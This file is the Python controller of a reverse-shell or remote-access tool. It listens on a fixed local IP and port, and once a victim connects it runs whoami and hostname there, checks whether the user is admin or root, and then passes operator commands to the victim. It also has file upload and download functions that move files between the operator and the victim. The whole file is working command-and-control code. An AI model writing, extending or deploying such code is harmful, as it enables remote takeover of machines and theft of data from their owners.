import socket
import json
import os
import time
import sys

GREEN = "\033[1;32m"
LGREEN = "\033[0;32m"
BLUE = "\033[1;34m"
LBLUE = "\033[0;34m"
RED = "\033[1;31m"
LRED = "\033[0;31m"
ORANGE='\033[1;93m'
LORANGE='\033[0;93m'
PURPLE='\033[1;95m'
LPURPLE='\033[0;95m'
BOLD = "\033[1;37m"
STOP = "\033[0m"

message = (
    f"\n{BOLD}┌──{STOP}({LRED}Message from Gh0stAn0n{STOP})\n"
    f"{BOLD}│ {STOP}\n"
    f"{BOLD}│ {STOP}Kali Linux is intended for security professionals and developers.\n"
    f"{BOLD}│ {STOP}If you are not a security professional or developer, you are on\n"
    f"{BOLD}│ {STOP}your own and don't complain if you b0rk your Kali Linux. Have fun!\n"
    f"{BOLD}│ {STOP}\n"
    f"{BOLD}└─{STOP}({LRED}You Are Aware{STOP}) ({LORANGE}Host{STOP}: {{}}, {LORANGE}IP{STOP}: {{}}, {LORANGE}Port{STOP}: {{}})\n"
)

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication(ip):
    while True:
        reliable_send('whoami')
        user = reliable_recv().rstrip()
        user = user.split('\\')[-1]

        reliable_send('hostname')
        host = reliable_recv().rstrip()

        ip_addr = str(ip[0])
        port = str(ip[1])

        reliable_send('cd')
        path = reliable_recv().rstrip()

        if user.lower() in ['admin', 'system', 'root']:
            shell_banner = f"\n{LBLUE}┌──({RED}{{}}㉿{{}}{LBLUE})-[{BOLD}~{{}}{LBLUE}]{STOP}"
            command_banner = f"{LBLUE}└─{RED}#{STOP} "
        else:
            shell_banner = f"\n{LGREEN}┌──({BLUE}{{}}㉿{{}}{LGREEN})-[{BOLD}~{{}}{LGREEN}]{STOP}"
            command_banner = f"{LGREEN}└─{BLUE}${STOP} "

        print(shell_banner.format(user, host, path)) # You can change 'host' to 'ip_addr' in order to display the target ip in the shell instead of the host
        try:
            command = input(command_banner)
        except KeyboardInterrupt:
            print(f"\n[{RED}!{STOP}] Keyboard Interrupt detected (CTRL+C). Exiting.\n")
            break

        reliable_send(command)
        if command in ['quit', 'exit']:
            if command == 'quit':
                print(f"\n[{RED}X{STOP}] Quitting the bindshell session.\n")
            else:
                print(f"\n[{RED}X{STOP}] Exiting the bindshell session.\n")
            break
        elif command in ['clear', 'cls']:
            check_OS()
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.88.130', 5555))

def check_OS():
    if os.system('ver') in ['Microsoft', 'Windows']:
        os.system('cls')
    else:
        os.system('clear')

try:

    check_OS()
    print(f"\n[{GREEN}+{STOP}] Listening For Incoming Connections.  ")

    sock.listen(5)
    target, ip = sock.accept()

    reliable_send('hostname')
    host = reliable_recv().rstrip()

    print(f"\n[{BLUE}+{STOP}] Incoming Connection From: " + str(ip[0]))
    print(message.format(host, str(ip[0]), str(ip[1])))
    target_communication(ip)
except KeyboardInterrupt:
    print(f"\n[{RED}!{STOP}] Keyboard Interrupt detected (CTRL+C). Exiting.\n")
finally:
    sock.close()